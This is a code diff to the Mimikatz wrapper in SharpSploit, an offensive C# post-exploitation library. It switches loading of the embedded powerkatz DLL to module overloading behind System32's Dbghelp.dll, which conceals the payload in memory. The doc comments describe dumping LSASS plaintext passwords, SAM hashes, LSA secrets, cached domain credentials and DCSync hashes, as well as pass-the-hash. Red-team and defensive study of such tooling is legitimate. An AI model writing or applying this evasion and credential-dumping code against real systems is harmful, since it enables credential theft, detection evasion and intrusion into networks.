@@ -12,6 +12,7 @@ using SharpSploit.Misc;
 using SharpSploit.Execution.ManualMap;
 using PInvoke = SharpSploit.Execution.PlatformInvoke;
 using SharpSploit.Persistence;
+using System.Diagnostics;
 
 namespace SharpSploit.Credentials
 {
@@ -23,7 +24,6 @@ namespace SharpSploit.Credentials
     /// <remarks>
     /// Mimikatz is a tool for playing with credentials in Windows, written by Benjamin Delpy (@gentilkiwi). (Found
     /// at https://github.com/gentilkiwi/mimikatz).
-    /// SharpSploit's PE Loader is adapted from work by Casey Smith (@subtee). (No longer available at original location.)
     /// This wrapper class is adapted from Chris Ross (@xorrior)'s implementation, converted by (@TheRealWover) to use the Manual Mapping API.
     /// </remarks>
     public class Mimikatz
@@ -37,7 +37,7 @@ namespace SharpSploit.Credentials
         private delegate string MimikatzType(string command);
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes a chosen Mimikatz command.
+        /// Loads the Mimikatz PE and executes a chosen Mimikatz command.
         /// </summary>
         /// <param name="Command">Mimikatz command to be executed.</param>
         /// <returns>Mimikatz output.</returns>
@@ -58,7 +58,9 @@ namespace SharpSploit.Credentials
                         PEBytes32 = Utilities.GetEmbeddedResourceBytes("powerkatz_x86.dll");
                         if (PEBytes32 == null) { return ""; }
                     }
-                    MimikatzPE = Map.MapModuleToMemory(PEBytes32);
+                    MimikatzPE = Overload.OverloadModule(PEBytes32, 
+                        Environment.GetEnvironmentVariable("WINDIR") + System.IO.Path.DirectorySeparatorChar + "System32" + System.IO.Path.DirectorySeparatorChar + "Dbghelp.dll");
+
                 }
                 else if (IntPtr.Size == 8)
                 {
@@ -67,7 +69,9 @@ namespace SharpSploit.Credentials
                         PEBytes64 = Utilities.GetEmbeddedResourceBytes("powerkatz_x64.dll");
                         if (PEBytes64 == null) { return ""; }
                     }
-                    MimikatzPE = Map.MapModuleToMemory(PEBytes64);
+                    MimikatzPE = Overload.OverloadModule(PEBytes64,
+                        Environment.GetEnvironmentVariable("WINDIR") + System.IO.Path.DirectorySeparatorChar + "System32" + System.IO.Path.DirectorySeparatorChar + "Dbghelp.dll");
+
                 }
             }
             catch (Exception ex)
@@ -100,6 +104,7 @@ namespace SharpSploit.Credentials
 
                 if (output == "")
                 {
+
                     return "";
                 }
 
@@ -113,7 +118,7 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatzcommand to retrieve plaintext
+        /// Loads the Mimikatz PE and executes the Mimikatzcommand to retrieve plaintext
         /// passwords from LSASS. Equates to `Command("privilege::debug sekurlsa::logonPasswords")`. (Requires Admin)
         /// </summary>
         /// <returns>Mimikatz output.</returns>
@@ -123,7 +128,7 @@ namespace SharpSploit.Credentials
 		}
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve password hashes
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve password hashes
         /// from the SAM database. Equates to `Command("privilege::debug lsadump::sam")`. (Requires Admin)
         /// </summary>
         /// <returns>Mimikatz output.</returns>
@@ -133,7 +138,7 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve LSA secrets
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve LSA secrets
         /// stored in registry. Equates to `Command("privilege::debug lsadump::secrets")`. (Requires Admin)
         /// </summary>
         /// <returns>Mimikatz output.</returns>
@@ -143,7 +148,7 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve Domain
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve Domain
         /// Cached Credentials hashes from registry. Equates to `Command("privilege::debug lsadump::cache")`.
         /// (Requires Admin)
         /// </summary>
@@ -154,7 +159,7 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve Wdigest
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve Wdigest
         /// credentials from registry. Equates to `Command("sekurlsa::wdigest")`.
         /// </summary>
         /// <returns>Mimikatz output.</returns>
@@ -164,7 +169,7 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes each of the builtin local commands (not DCSync). (Requires Admin)
+        /// Loads the Mimikatz PE and executes each of the builtin local commands (not DCSync). (Requires Admin)
         /// </summary>
         /// <returns>Mimikatz output.</returns>
 		public static string All()
@@ -179,7 +184,7 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the "dcsync" module to retrieve the NTLM hash of a specified (or all) Domain user. (Requires Domain Admin)
+        /// Loads the Mimikatz PE and executes the "dcsync" module to retrieve the NTLM hash of a specified (or all) Domain user. (Requires Domain Admin)
         /// </summary>
         /// <param name="user">Username to retrieve NTLM hash for. "All" for all domain users.</param>
         /// <param name="FQDN">Optionally specify an alternative fully qualified domain name. Default is current domain.</param>
@@ -215,7 +220,7 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the "pth" module to start a new process
+        /// Loads the Mimikatz PE and executes the "pth" module to start a new process
         /// as a user using an NTLM password hash for authentication.
         /// </summary>
         /// <param name="user">Username to authenticate as.</param>
